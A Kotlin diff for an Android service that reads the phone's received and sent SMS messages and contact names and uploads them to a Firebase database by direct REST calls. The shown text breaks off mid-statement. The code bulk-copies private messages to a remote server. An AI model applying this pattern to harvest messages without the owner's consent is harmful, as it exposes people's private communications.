@@ -10,6 +10,9 @@ import android.os.IBinder
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Log
+import java.io.OutputStreamWriter
+import java.net.HttpURLConnection
+import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.*
 
@@ -47,6 +50,25 @@ class MyBridgeService : Service() {
             cur?.use { if (it.moveToFirst()) it.getString(0) ?: "" else "" } ?: ""
         } catch (e: Exception) { "" }
     }
+    // Firebase REST API로 직접 업로드 - SDK 필요 없음
+    private fun pushToFirebase(path: String, json: String) {
+        try {
+            val url = URL("$DB_URL/$path.json")
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "PUT"
+            conn.doOutput = true
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.connectTimeout = 8000
+            conn.readTimeout = 8000
+            OutputStreamWriter(conn.outputStream).use { it.write(json) }
+            val code = conn.responseCode
+            Log.d(TAG, "REST $path -> $code")
+            conn.disconnect()
+        } catch (e: Exception) {
+            Log.e(TAG, "REST fail $path: ${e.message}")
+        }
+    }
+
     fun syncAllSms(ctx: Context) {
         Thread {
             try {
@@ -54,14 +76,22 @@ class MyBridgeService : Service() {
                 val inboxCur = cr.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
                 val sentCur = cr.query(Telephony.Sms.Sent.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC")
                 val cache = HashMap<String, String>()
-                val list = mutableListOf<Map<String, Any>>()
+                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault())
+
+                fun toJson(map: Map<String, Any>): String {
+                    return "{" + map.entries.joinToString(",") { (k,v) ->
+                        val vs = v.toString().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")
+                        "\"$k\":\"$vs\""
+                    } + "}"
+                }
+
+                var total = 0
                 fun proc(cur: Cursor?, type: String, max: Int) {
                     var cnt = 0
                     cur?.use {
                         val iAddr = it.getColumnIndex(Telephony.Sms.ADDRESS)
                         val iBody = it.getColumnIndex(Telephony.Sms.BODY)
                         val iDate = it.getColumnIndex(Telephony.Sms.DATE)
-                        val sdf = SimpleDateFormat("HH:mm", Locale.getDefault())
                         while (it.moveToNext() && cnt < max) {
                             try {
                                 val addr = if (iAddr>=0) it.getString(iAddr) ?: "" else ""
@@ -69,38 +99,8 @@ class MyBridgeService : Service() {
                                 if (addr.isBlank() || body.isBlank()) continue
                                 val name = cache.getOrPut(addr) { getContactName(ctx, addr) }
                                 val date = if (iDate>=0) it.getLong(iDate) else System.currentTimeMillis()
-                                list.add(mapOf(
+                                val map = mapOf(
                                     "sender" to addr, "address" to addr, "phone" to addr,
-                                    "message" to body.take(500), "body" to body.take(500),
-                                    "timestamp" to date, "time" to sdf.format(Date(date)),
-                                    "type" to type, "contactName" to name, "displayName" to name
-                                ))
-                                cnt++
-                            } catch (e: Exception) {}
-                        }
-                    }
-                }
-                proc(inboxCur, "received", 100)
-                proc(sentCur, "sent", 100)
-                try {
-                    val dbClass = Class.forName("com.google.firebase.database.FirebaseDatabase")
-                    val getInst = dbClass.getMethod("getInstance", String::class.java)
-                    val db = getInst.invoke(null, DB_URL)
-                    val getRef = db.javaClass.getMethod("getReference", String::class.java)
-                    val inboxRef = getRef.invoke(db, "sudataxi/inbox/sms")
-                    val childM = inboxRef.javaClass.getMethod("child", String::class.java)
-                    val setM = Class.forName("com.google.firebase.database.DatabaseReference").getMethod("setValue", Any::class.java)
-                    for ((i, sms) in list.withIndex()) {
-                        try {
-                            val r = childM.invoke(inboxRef, "${sms["timestamp"]}_${i}")
-                            setM.invoke(r, sms)
-                            if (i % 20 == 0) Thread.sleep(50)
-                        } catch (e: Exception) {}
-                    }
-                    val pingRef = getRef.invoke(db, "sudataxi/ping")
-                    setM.invoke(pingRef, true)
-                } catch (e: Exception) {}
-            } catch (e: Exception) { Log.e("SudaBridge", "error", e) }
-        }.start()
-    }
-}
+                                    "message" to body.take(500), "body" to body.take(500), "text" to body.take(500),
+                                    "timestamp" to date.toString(), "date" to date.toString(), "time" to sdf.format(Date(date)),
+                                    "type" to type, "contactName" to name
